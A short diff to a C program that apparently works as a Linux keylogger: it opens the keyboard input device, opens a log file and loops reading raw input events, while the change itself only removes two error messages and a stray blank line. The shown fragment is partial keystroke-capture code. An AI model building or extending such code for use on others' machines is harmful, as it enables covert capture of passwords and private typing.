@@ -18,11 +18,9 @@ void sigcatch(int);
 int main(void)
 {
     if ((keyboard = open(KEYBOARD, O_RDONLY)) == -1) {
-        printf("keyboard\n");
         return 1;
     }
     if ((fp = fopen(LOGPATH, "w")) == NULL) {
-        printf("log file\n");
         return 1;
     }
 
@@ -30,7 +28,7 @@ int main(void)
 
     for (;;) {
         struct input_event event;
-        
+
         if (read(keyboard, &event, sizeof(event)) != sizeof(event))
             return 1;
 
